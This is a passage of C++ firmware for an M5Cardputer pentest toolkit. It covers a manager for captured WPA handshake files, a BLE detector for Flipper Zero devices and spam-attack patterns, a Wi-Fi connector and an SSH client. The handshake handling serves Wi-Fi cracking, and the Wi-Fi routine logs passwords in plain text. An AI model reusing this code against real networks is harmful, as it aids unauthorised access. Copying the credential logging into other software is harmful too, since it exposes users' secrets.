      ok++;
    else
      invalid.push_back(pcapFiles[i]);
  }

  char buf[64]; sprintf(buf,"%d / %d files valid", (int)ok, (int)total);
  okPopup(String(buf));

  if(invalid.empty()) return;                       // tout est bon

  sprintf(buf,"Delete %d invalid files ?", (int)invalid.size());
  if(!confirmPopup(String(buf))) return;

  for(const String& fn : invalid){
    String p = makeFullPath(fn);
    if(SD.exists(p)) SD.remove(p);
  }
  loadPcapFiles();          // maj de la liste
  displayPcapList();
}



/* ======================================================================================================================
   charge la liste .pcap
   ==================================================================================================================== */
void loadPcapFiles(){
  pcapFiles.clear(); pcapFiles.push_back("ALL");
  File root=SD.open(HANDSHAKES_DIR);
  while(File f=root.openNextFile()){
    if(!f.isDirectory() && String(f.name()).endsWith(".pcap")) pcapFiles.push_back(String(f.name()));
  }
  currentListIndexPcap=0;
}

/* --------- UI --------- */
void displayPcapList(){
  const int h=18, win=M5.Display.height()/h;
  int s=max(0,min(currentListIndexPcap,int(pcapFiles.size())-win));
  M5.Display.clear(); M5.Display.setTextSize(1.5);
  for(int i=s;i<min(int(pcapFiles.size()),s+win);++i){
    if(i==currentListIndexPcap){
      M5.Display.fillRect(0,(i-s)*h,M5.Display.width(),h,menuSelectedBackgroundColor);
      M5.Display.setTextColor(menuTextFocusedColor);
    }else M5.Display.setTextColor(menuTextUnFocusedColor);
    M5.Display.setCursor(10,(i-s)*h); M5.Display.println(pcapFiles[i]);
  }
  M5.Display.display();
}
void navigatePcapList(bool next){
  currentListIndexPcap = next ? (currentListIndexPcap+1)%pcapFiles.size()
                              : (currentListIndexPcap?currentListIndexPcap-1:pcapFiles.size()-1);
  displayPcapList();
}

/* ======================================================================================================================
   checkHandshakes  â€”  point dâ€™entrÃ©e du sous-menu â€œHandshakesâ€
   ==================================================================================================================== */
void checkHandshakes(){
  loadPcapFiles();
  displayPcapList();        // premiÃ¨re vue = liste
  enterDebounce();

  const unsigned long db = 250;
  unsigned long       t  = 0;

  while(true){
    M5.update(); M5Cardputer.update(); unsigned long n = millis();

    /* dÃ©placement curseur dans la liste */
    if(M5Cardputer.Keyboard.isKeyPressed('.') && n-t > db){ navigatePcapList(true);  t=n; }
    if(M5Cardputer.Keyboard.isKeyPressed(';') && n-t > db){ navigatePcapList(false); t=n; }

    /* sÃ©lection */
    if(M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER) && n-t > db){
      String sel = pcapFiles[currentListIndexPcap];
      if(sel == "ALL"){
        analyzeAllPcaps();
        displayPcapList();                         // on reste dans la liste
      }else{
        viewPcapDetails();                         // â†© revient dans la liste
        displayPcapList();                         // rafraÃ®chir lâ€™Ã©cran
      }
      t = millis();
    }

    /* retour Menu gÃ©nÃ©ral */
    if(M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE)){
      waitAndReturnToMenu("Return to menu");
      return;
    }
  }
}

/* ==================================================== FIN ========================================================= */
/*
============================================================================================================================
// Wall of Flippers - UI ModernisÃ©e (Cardputer ESP32S3)
// Modifications : couleurs Flipper, nom sans "Flipper ", purge 10s, 2 frames BLE
============================================================================================================================
*/

// ===================== GLOBALES & STRUCTURES =====================
unsigned long lastFlipperFoundMillis = 0; 

struct ForbiddenPacket {
  const char* pattern;
  const char* type;
};

std::vector<ForbiddenPacket> forbiddenPackets = {
  {"4c0007190_______________00_____", "APPLE_DEVICE_POPUP"},
  {"4c000f05c0_____________________", "APPLE_ACTION_MODAL"},
  {"4c00071907_____________________", "APPLE_DEVICE_CONNECT"},
  {"4c0004042a0000000f05c1__604c950", "APPLE_DEVICE_SETUP"},
  {"2cfe___________________________", "ANDROID_DEVICE_CONNECT"},
  {"750000000000000000000000000000_", "SAMSUNG_BUDS_POPUP"},
  {"7500010002000101ff000043_______", "SAMSUNG_WATCH_PAIR"},
  {"0600030080_____________________", "WINDOWS_SWIFT_PAIR"},
  {"ff006db643ce97fe427c___________", "LOVE_TOYS"}
};

// Matcher de pattern
bool matchPattern(const char* pattern, const uint8_t* payload, size_t length) {
  size_t patternLength = strlen(pattern);
  for (size_t i = 0, j = 0; i < patternLength && j < length; i += 2, j++) {
    char byteString[3] = {pattern[i], pattern[i + 1], 0};
    if (byteString[0] == '_' && byteString[1] == '_') continue;
    uint8_t byteValue = strtoul(byteString, nullptr, 16);
    if (payload[j] != byteValue) return false;
  }
  return true;
}

// VÃ©rifie si une MAC est dÃ©jÃ  enregistrÃ©e
bool isMacAddressRecorded(const String& macAddress) {
  File file = SD.open("/evil/WoF.txt", FILE_READ);
  if (!file) return false;
  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.indexOf(macAddress) >= 0) {
      file.close();
      return true;
    }
  }
  file.close();
  return false;
}

// Enregistre un Flipper dÃ©tectÃ©
void recordFlipper(const String& name, const String& macAddress, const String& color, bool isValidMac) {
  if (!isMacAddressRecorded(macAddress)) {
    File file = SD.open("/evil/WoF.txt", FILE_APPEND);
    if (file) {
      String status = isValidMac ? " - normal" : " - spoofed";
      file.println(name + " - " + macAddress + " - " + color + status);
      Serial.println("Flipper saved: \n" + name + " - " + macAddress + " - " + color + status);
      file.close();
    }
  }
}

// ===================== UI CONFIG =====================
#ifndef TFT_ORANGE
  #define TFT_ORANGE (uint16_t)0xFD20
#endif
#define WOF_BG              TFT_BLACK
#define WOF_ACCENT          TFT_ORANGE
#define WOF_TEXT            TFT_WHITE
#define WOF_MUTED           TFT_DARKGREY

// Couleurs Flipper
#define WOF_WHITE   TFT_WHITE
#define WOF_BLACK   TFT_BLACK
#define WOF_TRANS   TFT_CYAN  // pour "transparent", cyan comme compromis visuel

static const int WOF_HDR_H    = 18;
static const int WOF_SPAM_H   = 3 * 12 + 8;
static const int WOF_LIST_Y   = WOF_HDR_H + 2;
static const int WOF_LIST_H   = 135 - WOF_HDR_H - WOF_SPAM_H - 4;
static const int WOF_LINE_H   = 13;
static const int WOF_VISIBLE  = (WOF_LIST_H / WOF_LINE_H);
static const int WOF_MAX      = 24;

struct WofItem {
  String name;
  String mac;
  String color;
  int8_t rssi;
  bool valid;
  unsigned long lastSeen;
};
static std::vector<WofItem> wofItems;
static int wofCount = 0;

static int wofTop = 0;
static int wofSel = 0;
static unsigned long wofLastHeaderUpdate = 0;
static unsigned long wofLastListUpdate   = 0;
static unsigned long wofLastSpamUpdate   = 0;

static String wofSpam[2];   // seulement 2 frames
static int wofSpamHead = 0;

static int wofValidCount = 0;
static int wofSpoofCount = 0;
static unsigned long wofLastActivityMs = 0;

// Helpers
inline String fitLeft(const String& s, int maxChars) {
  if ((int)s.length() <= maxChars) return s;
  return s.substring(0, maxChars - 2) + "..";
}

// Recompte OK / SP
void wofRecountValidity() {
  int ok = 0, sp = 0;
  for (int i = 0; i < wofCount; ++i) {
    if (wofItems[i].valid) ok++;
    else sp++;
  }
  wofValidCount = ok;
  wofSpoofCount = sp;
}


// ===================== RENDU UI =====================
void wofDrawHeader(bool force = false) {
  unsigned long now = millis();
  if (!force && (now - wofLastHeaderUpdate) < 250) return;
  wofLastHeaderUpdate = now;
  M5.Display.fillRect(0, 0, 240, WOF_HDR_H, WOF_ACCENT);
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(TFT_BLACK, WOF_ACCENT);
  M5.Display.setCursor(6, 4);
  M5.Display.print("Wall of Flippers");
  char buf[40];
  snprintf(buf, sizeof(buf), "OK:%d  SP:%d", wofValidCount, wofSpoofCount);
  int w = M5.Display.textWidth(buf);
  M5.Display.setCursor(240 - w - 6, 4);
  M5.Display.print(buf);
}

void wofDrawList(bool force = false) {
  unsigned long now = millis();
  if (!force && (now - wofLastListUpdate) < 150) return;
  wofLastListUpdate = now;

  // Purge Flippers inactifs (>1.5s)
  unsigned long ms = millis();
  for (int i = 0; i < wofCount; ) {
    if (ms - wofItems[i].lastSeen > 1500) {
      wofItems.erase(wofItems.begin() + i);
      wofCount = (int)wofItems.size();
    } else {
      i++;
    }
  }

  M5.Display.fillRect(0, WOF_LIST_Y, 240, WOF_LIST_H, WOF_BG);
  M5.Display.setTextSize(1.5);
  for (int row = 0; row < WOF_VISIBLE; ++row) {
    int idx = wofTop + row;
    if (idx >= wofCount) break;
    int y = WOF_LIST_Y + row * WOF_LINE_H;

    M5.Display.setTextColor(WOF_TEXT, WOF_BG);

    // point couleur selon Flipper
    uint16_t dot = WOF_TEXT;
    if (wofItems[idx].color == "White") dot = WOF_WHITE;
    else if (wofItems[idx].color == "Black") dot = WOF_BLACK;
    else if (wofItems[idx].color == "Transp") dot = WOF_TRANS;

    M5.Display.fillCircle(5, y + (WOF_LINE_H / 2), 3, dot);

    // Nom (sans "Flipper ")
    String dispName = wofItems[idx].name;
    if (dispName.startsWith("Flipper ")) dispName.remove(0, 8);

    String left  = fitLeft(dispName, 14);
    String right = String(wofItems[idx].rssi) + " dBm";

    M5.Display.setCursor(15, y + 2); M5.Display.print(left);
    int w = M5.Display.textWidth(right);
    M5.Display.setCursor(240 - w - 4, y + 2); M5.Display.print(right);
  }
}

void wofDrawSpamBox(bool force = false) {
  unsigned long now = millis();
  if (!force && (now - wofLastSpamUpdate) < 150) return;
  wofLastSpamUpdate = now;
  int y = 135 - WOF_SPAM_H;
  M5.Display.drawRoundRect(3, y, 234, WOF_SPAM_H - 4, 5, WOF_MUTED);
  M5.Display.setTextSize(1);
  M5.Display.setTextColor(WOF_MUTED, WOF_BG);
  M5.Display.setCursor(10, y + 2);
  M5.Display.print("BLE Frames (last 2)");
  M5.Display.fillRect(5, y + 14, 230, WOF_SPAM_H - 20, WOF_BG);
  M5.Display.setTextColor(WOF_TEXT, WOF_BG);
  int lineY = y + 18;
  for (int i = 0; i < 2; ++i) {
    int idx = (wofSpamHead - 1 - i + 2) % 2;
    if (wofSpam[idx].length() == 0) continue;
    M5.Display.setCursor(10, lineY + i * 12);
    M5.Display.print(wofSpam[idx]);
  }
}

// ===================== DATA/UI BINDING =====================
void wofResetUI() {
  wofTop = 0; wofSel = 0; wofValidCount = 0; wofSpoofCount = 0;
  wofItems.clear();
  wofItems.reserve(WOF_MAX);
  wofCount = 0;
  for (int i = 0; i < 2; ++i) wofSpam[i] = "";
  wofSpamHead = 0;
  M5.Display.fillScreen(WOF_BG);
  wofDrawHeader(true); wofDrawList(true); wofDrawSpamBox(true);
}
void wofPushSpam(const char* type) {
  wofSpam[wofSpamHead] = type;
  wofSpamHead = (wofSpamHead + 1) % 2;
  wofDrawSpamBox(true);
}
int wofFindByMac(const String& mac) {
  for (int i = 0; i < wofCount; ++i) if (wofItems[i].mac == mac) return i;
  return -1;
}
void wofPushFlipper(const String& name,
                           const String& mac,
                           const String& color,
                           int8_t rssi,
                           bool valid) {
  int idx = wofFindByMac(mac);
  if (idx < 0) {
    if (wofCount >= WOF_MAX) {
      if (!wofItems.empty()) wofItems.erase(wofItems.begin());
    }
    wofItems.emplace_back();
    idx = (int)wofItems.size() - 1;
    wofCount = (int)wofItems.size();
  }
  wofItems[idx].name = name;
  wofItems[idx].mac = mac;
  wofItems[idx].color = color;
  wofItems[idx].rssi = rssi;
  wofItems[idx].valid = valid;
  wofItems[idx].lastSeen = millis();
  wofLastActivityMs = wofItems[idx].lastSeen;
  wofRecountValidity();
  wofDrawHeader(false); wofDrawList(true);
}

// ===================== CALLBACKS =====================
class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
  void onResult(BLEAdvertisedDevice advertisedDevice) override {
    String deviceColor = "Unknown"; bool isValidMac = false; bool isFlipper = false;
    if (advertisedDevice.isAdvertisingService(BLEUUID("00003082-0000-1000-8000-00805f9b34fb"))) {
      deviceColor = "White"; isFlipper = true;
    } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003081-0000-1000-8000-00805f9b34fb"))) {
      deviceColor = "Black"; isFlipper = true;
    } else if (advertisedDevice.isAdvertisingService(BLEUUID("00003083-0000-1000-8000-00805f9b34fb"))) {
      deviceColor = "Transp"; isFlipper = true;
    }
    if (isFlipper) {
      String macAddress = advertisedDevice.getAddress().toString().c_str();
      if (macAddress.startsWith("80:e1:26") || macAddress.startsWith("80:e1:27") || macAddress.startsWith("0C:FA:22")) {
        isValidMac = true;
      }
      String name = advertisedDevice.getName().c_str();
      wofPushFlipper(name, macAddress, deviceColor, (int8_t)advertisedDevice.getRSSI(), isValidMac);
      recordFlipper(name, macAddress, deviceColor, isValidMac);
      lastFlipperFoundMillis = millis();
    }
    std::string advData = advertisedDevice.getManufacturerData();
    if (!advData.empty()) {
      const uint8_t* payload = reinterpret_cast<const uint8_t*>(advData.data());
      size_t length = advData.length();
      for (auto& packet : forbiddenPackets) {
        if (matchPattern(packet.pattern, payload, length)) {
          wofPushSpam(packet.type);
          break;
        }
      }
    }
  }
};

// ===================== BLE INIT =====================
void initializeBLEIfNeeded() {
  if (!isBLEInitialized) {
    BLEDevice::init("");
    isBLEInitialized = true;
    Serial.println(F("BLE initialized for scanning."));
  }
}

// ===================== NAVIGATION & TOUCHES =====================
void wofHandleKeys(bool& shouldExit) {
  M5Cardputer.update();
  M5.update();

  // Quitter avec BACKSPACE ou ENTER
  if (M5Cardputer.Keyboard.isKeyPressed(KEY_BACKSPACE) ||
      M5Cardputer.Keyboard.isKeyPressed(KEY_ENTER)) {
    shouldExit = true;
    return;
  }

  // Scroll avec ; et .
  static unsigned long lastKey = 0;
  const unsigned long rpt = 130; // anti-rebond

  if (M5Cardputer.Keyboard.isKeyPressed(';')) {
    if (millis() - lastKey > rpt) {
      if (wofSel > 0) wofSel--;
      if (wofSel < wofTop) wofTop = wofSel;
      wofDrawList(true);
      lastKey = millis();
    }
  } else if (M5Cardputer.Keyboard.isKeyPressed('.')) {
    if (millis() - lastKey > rpt) {
      if (wofSel < max(0, wofCount - 1)) wofSel++;
      if (wofSel >= (wofTop + WOF_VISIBLE))
        wofTop = max(0, wofSel - (WOF_VISIBLE - 1));
      wofDrawList(true);
      lastKey = millis();
    }
  }
}


// ===================== MAIN WOF LOOP =====================
void wallOfFlipper() {
  bool exitRequested = false;
  wofResetUI();
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(WOF_TEXT, WOF_BG);
  M5.Display.setCursor(8, WOF_LIST_Y + 4);
  M5.Display.print("Scan BLE en cours...");
  initializeBLEIfNeeded();
  delay(120);
  enterDebounce();
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks(), true);
  while (!exitRequested) {
    wofHandleKeys(exitRequested);
    pBLEScan->setActiveScan(true);
    pBLEScan->start(1, false);
    wofDrawList(false);
    wofDrawSpamBox(false);
  }
  releaseBLE();
  waitAndReturnToMenu("Stop detection...");
}


/*
============================================================================================================================
Connect to wifi
============================================================================================================================
*/

// Fonction pour se connecter au Wi-Fi
bool connectToWiFi(const String& ssid, const String& password) {
  WiFi.begin(ssid.c_str(), password.c_str());

  M5.Display.clear();
  M5.Display.setCursor(5, 10);
  M5.Display.println("Connecting to WiFi...");
  M5.Display.display();

  Serial.print(F("Connecting to SSID: "));
  Serial.println(ssid);

  int timeout = 10; // Timeout de 10 secondes pour la connexion
  while (WiFi.status() != WL_CONNECTED && timeout > 0) {
    delay(1000);
    timeout--;
    Serial.print(F("."));
  }
  Serial.println();

  if (WiFi.status() == WL_CONNECTED) {
    Serial.println(F("WiFi connected successfully!"));
    M5.Display.clear();
    M5.Display.setCursor(5, 10);
    M5.Display.println("Connected!");
    M5.Display.setCursor(5, 30);
    M5.Display.println("IP: " + WiFi.localIP().toString());
    M5.Display.display();
    delay(2000); // Affiche le message pendant 2 secondes
    return true;
  } else {
    Serial.println(F("Failed to connect to WiFi."));
    M5.Display.clear();
    M5.Display.setCursor(5, 10);
    M5.Display.println("Failed to connect.");
    M5.Display.setCursor(5, 30);
    M5.Display.println("Please try again.");
    M5.Display.display();
    delay(2000); // Affiche le message pendant 2 secondes
    return false;
  }
}

// Fonction principale de connexion Wi-Fi
void connectWifi(int networkIndex) {
  Serial.println(F("Starting WiFi connection process..."));

  if (WiFi.localIP().toString() != "0.0.0.0") {
    if (confirmPopup("You want to disconnect ?")) {
      Serial.println(F("Disconnecting from current WiFi..."));
      WiFi.disconnect(true);
      waitAndReturnToMenu("Disconnected");
      return;
    } else {
      waitAndReturnToMenu("Stay connected...");
      return;
    }
  }

  String nameSSID = ssidList[networkIndex];
  String typedPassword = "";

  Serial.print(F("Selected network SSID: "));
  Serial.println(nameSSID);

  // Si le rÃ©seau est ouvert, passer directement Ã  la connexion
  if (getWifiSecurity(networkIndex) == "Open") {
    Serial.println(F("Network is open, no password required."));
    if (connectToWiFi(nameSSID, "")) {
      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
      ssid = nameSSID; // Stocke le SSID sÃ©lectionnÃ©
    } else {
      waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
    }
    return;
  }
  
  // VÃ©rifier si le SSID est dÃ©jÃ  enregistrÃ©
  if (ssid == nameSSID) {
    Serial.println(F("Previously connected to this network. Trying saved password..."));
    if (connectToWiFi(nameSSID, password)) {
      waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
      return;
    } else {
      Serial.println(F("Failed to connect with saved password, asking for a new one..."));
    }
  }

  // Demander le mot de passe pour les rÃ©seaux sÃ©curisÃ©s
  M5.Display.clear();
  M5.Display.setCursor(5, 10);
  M5.Display.println("Enter Password for " + nameSSID + " :");
  M5.Display.setCursor(5, 30);
  M5.Display.display();
  enterDebounce();
  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

        for (auto i : status.word) {
          typedPassword += i;
        }

        if (status.del && typedPassword.length() > 0) {
          typedPassword.remove(typedPassword.length() - 1);
        }

        M5.Display.clear();
        M5.Display.setCursor(5, 10);
        M5.Display.println("Password for " + nameSSID + " :");
        M5.Display.setCursor(5, 30);
        M5.Display.println(typedPassword); // Affichez le mot de passe en clair
        M5.Display.display();

        if (status.enter) {
          Serial.print(F("Attempting to connect to WiFi with password: "));
          Serial.println(typedPassword);

          if (connectToWiFi(nameSSID, typedPassword)) {
            waitAndReturnToMenu("Connected to WiFi: " + nameSSID);
            ssid = nameSSID; // Stocke le SSID sÃ©lectionnÃ©
            password = typedPassword;
          } else {
            waitAndReturnToMenu("Failed to connect to WiFi: " + nameSSID);
          }
          break;
        }
      }
      delay(200);
    }
  }
}


/*
============================================================================================================================
connect to SSH
============================================================================================================================
*/
//from https://github.com/fernandofatech/M5Cardputer-SSHClient and refactored
bool sshKilled = false;
void testConnectivity(const char *host) {
  M5.Display.clear();
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.setCursor(5, 10);
  Serial.println(F("Pinging Host..."));
  M5.Display.print("Pinging: " + String(host));
  if (Ping.ping(host)) {
    M5.Display.setCursor(5, 10);
    Serial.println(F("Ping successfull"));
    M5.Display.println("Ping successfull                            ");
  } else {
    M5.Display.setCursor(5, 10);
    M5.Display.println("Ping Failed                                 ");
    Serial.println(F("Ping failed"));
  }
}

ssh_session connect_ssh(const char *host, const char *user, int port) {
  ssh_session session = ssh_new();
  if (session == NULL) {
    Serial.println(F("Failed to create SSH session"));
    return NULL;
  }

  ssh_options_set(session, SSH_OPTIONS_HOST, host);
  ssh_options_set(session, SSH_OPTIONS_USER, user);
  ssh_options_set(session, SSH_OPTIONS_PORT, &port);

  if (ssh_connect(session) != SSH_OK) {
    Serial.print(F("Error connecting to host"));
    M5.Display.setCursor(5, 10);
    M5.Display.print("Error connecting to host");
    Serial.println(ssh_get_error(session));
    ssh_free(session);
    return NULL;
  }

  return session;
}

int authenticate_console(ssh_session session, const char *password) {
  int rc = ssh_userauth_password(session, NULL, password);
  if (rc != SSH_AUTH_SUCCESS) {
    Serial.print(F("Password error authenticating"));
    M5.Display.setCursor(5, 10);
    M5.Display.print("Password error authenticating");
    Serial.println(ssh_get_error(session));
    return rc;
  }
  return SSH_OK;
}

void sshConnectTask(void *pvParameters) {
  testConnectivity(ssh_host.c_str()); // Test de connectivitÃ©

  my_ssh_session = connect_ssh(ssh_host.c_str(), ssh_user.c_str(), ssh_port);
  if (my_ssh_session == NULL) {
    Serial.println(F("SSH Connection failed."));
    M5.Display.setCursor(5, 10);
    M5.Display.print("SSH Connection failed.");
    vTaskDelete(NULL);
    return;
  }

  if (authenticate_console(my_ssh_session, ssh_password.c_str()) != SSH_OK) {
    Serial.println(F("SSH Authentication failed."));
    M5.Display.setCursor(5, 10);
    M5.Display.print("SSH Authentication failed.");
    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    vTaskDelete(NULL);
    sshKilled = true;
    return;
  }

  my_channel = ssh_channel_new(my_ssh_session);
  if (my_channel == NULL || ssh_channel_open_session(my_channel) != SSH_OK) {
    Serial.println(F("SSH Channel open error."));
    M5.Display.setCursor(5, 10);
    M5.Display.print("SSH Channel open error.");
    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    vTaskDelete(NULL);
    sshKilled = true;
    return;
  }

  if (ssh_channel_request_pty(my_channel) != SSH_OK || ssh_channel_request_shell(my_channel) != SSH_OK) {
    Serial.println(F("Request PTY/Shell failed."));
    M5.Display.setCursor(5, 10);
    M5.Display.print("Request PTY/Shell failed.");
    ssh_channel_close(my_channel);
    ssh_channel_free(my_channel);
    ssh_disconnect(my_ssh_session);
    ssh_free(my_ssh_session);
    vTaskDelete(NULL);
    sshKilled = true;
    return;
  }

  M5.Display.clear();
  M5.Display.setCursor(5, 10);
  M5.Display.println("SSH Connection established.");
  M5.Display.display();

  xTaskCreatePinnedToCore(sshTask, "SSH Task", 16392, NULL, 1, NULL, 1);
  vTaskDelete(NULL);
}

String getUserInput(bool isPassword = false) {
  String input = "";
  M5.Display.setTextSize(1.5);
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  M5.Display.setCursor(5, 30);
  while (true) {
    M5Cardputer.update();
    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

        for (auto i : status.word) {
          input += i;
        }

        if (status.del && input.length() > 0) {
          input.remove(input.length() - 1);
          M5.Display.setCursor(5, 30);
          M5.Display.print("                                          ");
        }

        if (status.enter && input.length() > 0) {
          return input;
        }

        M5.Display.setCursor(5, 30);
        M5.Display.print(input);
        M5.Display.display();
      }
    }
    delay(200); // Petit dÃ©lai pour rÃ©duire la charge du processeur
  }
}

void parseUserHostPort(const String &input, String &user, String &host, int &port) {
  int atIndex = input.indexOf('@');
  int colonIndex = input.indexOf(':');
  if (atIndex != -1 && colonIndex != -1) {
    user = input.substring(0, atIndex);
    host = input.substring(atIndex + 1, colonIndex);
    port = input.substring(colonIndex + 1).toInt();
  }
}


// Fonction principale pour se connecter via SSH
void sshConnect(const char *host) {
   sshKilled = false;
  M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
  if (WiFi.localIP().toString() == "0.0.0.0") {
    waitAndReturnToMenu("Not connected...");
    return;
  }

  if (host == nullptr) {
    // Demander Ã  l'utilisateur s'il souhaite utiliser les informations stockÃ©es si elles ne sont pas vides
    if (ssh_user != "" && ssh_host != "" && ssh_password != "") {
      if (confirmPopup("Use stored SSH details?")) {
        // Utiliser les informations stockÃ©es
        Serial.print(F("Using stored SSH details: "));
        Serial.println("User: " + ssh_user + ", Host: " + ssh_host + ", Port: " + String(ssh_port));
      } else {
        // Demander de nouvelles informations
        ssh_user = "";
        ssh_host = "";
        ssh_password = "";
      }
    }

    if (ssh_user == "" || ssh_host == "" || ssh_password == "") {
      M5.Display.clear();
      M5.Display.setCursor(5, 10);
      M5.Display.println("Enter SSH User@Host:Port:");
      String userHostPort = getUserInput();
      parseUserHostPort(userHostPort, ssh_user, ssh_host, ssh_port);
    }
  } else {
    ssh_host = host;
    ssh_password = "";
    M5.Display.clear();
    M5.Display.setCursor(5, 10);
    M5.Display.println("Enter SSH User:");
    ssh_user = getUserInput();

    M5.Display.clear();
    M5.Display.setCursor(5, 10);
    M5.Display.println("Enter SSH Port:");
    String portStr = getUserInput();
    ssh_port = portStr.toInt();
  }
  if (ssh_password == "") {
    M5.Display.clear();
    M5.Display.setCursor(5, 10);
    M5.Display.println("Enter SSH Password:");
    ssh_password = getUserInput();
  }
  if (ssh_user.length() == 0 || ssh_host.length() == 0 || ssh_password.length() == 0) {
    waitAndReturnToMenu("Invalid input.");
    return;
  }

  Serial.print(F("SSH User: "));
  Serial.println(ssh_user);
  Serial.print(F("SSH Host: "));
  Serial.println(ssh_host);
  Serial.print(F("SSH Port: "));
  Serial.println(ssh_port);

  TaskHandle_t sshConnectTaskHandle = NULL;
  xTaskCreatePinnedToCore(sshConnectTask, "SSH Connect Task", 16392, NULL, 1, &sshConnectTaskHandle, 1);
  if (sshConnectTaskHandle == NULL) {
    Serial.println(F("Failed to create SSH Connect Task"));
  } else {
    while (true) {
      if (sshKilled) {
        delay(1000);
        break;
      }
      delay(100);
    }
  }
  waitAndReturnToMenu("Back to menu");
}

// Convert String to std::string
std::string StringToStdString(const String &input) {
  return std::string(input.c_str());
}

// Convert std::string to String
String StdStringToString(const std::string &input) {
  return String(input.c_str());
}

// Function to remove ANSI escape codes
String removeANSIEscapeCodes(const String &input) {
  std::string output = StringToStdString(input);

  // Regex for ANSI escape codes
  std::regex ansi_regex(R"(\x1B\[[0-?]*[ -/]*[@-~])");
  output = std::regex_replace(output, ansi_regex, "");

  // Remove other escape codes
  std::regex other_escape_codes(R"(\x1B\]0;.*?\x07|\x1B\[\?1[hl]|\x1B\[\?2004[hl]|\x1B=|\x1B>|(\x07)|(\x08)|(\x1B\(B))");
  output = std::regex_replace(output, other_escape_codes, "");

  // Remove non-printable characters except space
  output.erase(std::remove_if(output.begin(), output.end(), [](unsigned char c) {
    return !std::isprint(c) && !std::isspace(c);
  }), output.end());

  return StdStringToString(output);
}

String trimString(const String &str) {
  int start = 0;
  while (start < str.length() && isspace(str[start])) {
    start++;
  }

  int end = str.length() - 1;
  while (end >= 0 && isspace(str[end])) {
    end--;
  }

  return str.substring(start, end + 1);
}

void sshTask(void *pvParameters) {
  Serial.println(F("starting sshtask")); // debug here
  ssh_channel channel = my_channel;
  if (channel == NULL) {
    M5Cardputer.Display.println("SSH Channel not open.");
    vTaskDelete(NULL);
    return;
  }

  String commandBuffer = "> ";
  String currentCommand = "";
  int cursorX = 0;
  int cursorY = 0;
  const int lineHeight = 16;
  unsigned long lastKeyPressMillis = 0;
  const unsigned long debounceDelay = 200;

  int displayHeight = M5Cardputer.Display.height();
  int displayWidth = M5Cardputer.Display.width();
  int totalLines = displayHeight / lineHeight;
  int currentLine = 0;

  M5Cardputer.Display.clear();
  M5Cardputer.Display.setTextSize(1);
  M5Cardputer.Display.setCursor(cursorX, cursorY);
  M5Cardputer.Display.print(commandBuffer);
  M5Cardputer.Display.display();
  Serial.println(F("entering while true"));// debug here
  while (true) {
    M5Cardputer.update();

    if (M5Cardputer.Keyboard.isChange()) {
      if (M5Cardputer.Keyboard.isPressed()) {
        unsigned long currentMillis = millis();
        if (currentMillis - lastKeyPressMillis >= debounceDelay) {
          Keyboard_Class::KeysState status = M5Cardputer.Keyboard.keysState();

          // Check for esc key press
          if (M5Cardputer.Keyboard.isKeyPressed('`')) {
            Serial.println(F("esc pressed, closing SSH session and returning to menu"));
            // Close SSH session and return to menu
            sshKilled = true;
            break;
          }

          // Check for CTRL+C
          if (M5Cardputer.Keyboard.isKeyPressed(KEY_LEFT_CTRL) && M5Cardputer.Keyboard.isKeyPressed('C')) {
            Serial.println(F("CTRL+C pressed, sending interrupt signal to SSH session"));
            ssh_channel_write(channel, "\x03", 1); // Send CTRL+C
          }
          // Check for TAB // not working properlly
          else if (M5Cardputer.Keyboard.isKeyPressed(KEY_TAB)) {
            Serial.println(F("TAB pressed, requesting completion from SSH session"));
            String completionCommand = currentCommand + '\t'; // Append TAB character for completion
            Serial.print(F("Command sent: "));
            Serial.println(completionCommand);
            ssh_channel_write(channel, completionCommand.c_str(), completionCommand.length());

            // Read the completion response from the server
            char completionBuffer[512];
            int completionBytes = ssh_channel_read_nonblocking(channel, completionBuffer, sizeof(completionBuffer), 0);
            if (completionBytes > 0) {
              String completionResponse = "";
              for (int i = 0; i < completionBytes; ++i) {
                completionResponse += completionBuffer[i];
              }

              completionResponse = removeANSIEscapeCodes(completionResponse);

              // Clear the current command and buffer
              commandBuffer = "> ";
              currentCommand = "";

              // Update the command buffer with the completion response
              currentCommand = trimString(completionResponse);
              commandBuffer += currentCommand;

              // Clear the display and update with new command
              M5Cardputer.Display.clear();
              cursorX = 0;
              cursorY = 0;
              currentLine = 0;
              M5Cardputer.Display.setCursor(cursorX, cursorY);
              M5Cardputer.Display.print(commandBuffer);
              M5Cardputer.Display.display();
            }
          }
          else {
            for (auto i : status.word) {
              commandBuffer += i;
              currentCommand += i;
              M5Cardputer.Display.print(i);
              cursorX = M5Cardputer.Display.getCursorX();
              if (cursorX >= displayWidth) {
                cursorX = 0;
                cursorY += lineHeight;
                currentLine++;
                if (currentLine >= totalLines) {
                  M5Cardputer.Display.scroll(0, -lineHeight);
                  cursorY = displayHeight - lineHeight;
                  currentLine = totalLines - 1;
                }
                M5Cardputer.Display.setCursor(cursorX, cursorY);
              }
            }

            if (status.del && commandBuffer.length() > 2) {
              commandBuffer.remove(commandBuffer.length() - 1);
              currentCommand.remove(currentCommand.length() - 1);
              cursorX -= 6;
              if (cursorX < 0) {
                cursorX = displayWidth - 6;
                cursorY -= lineHeight;
                currentLine--;
                if (currentLine < 0) {
                  currentLine = 0;
                  cursorY = 0;
                }
              }
              M5Cardputer.Display.setCursor(cursorX, cursorY);
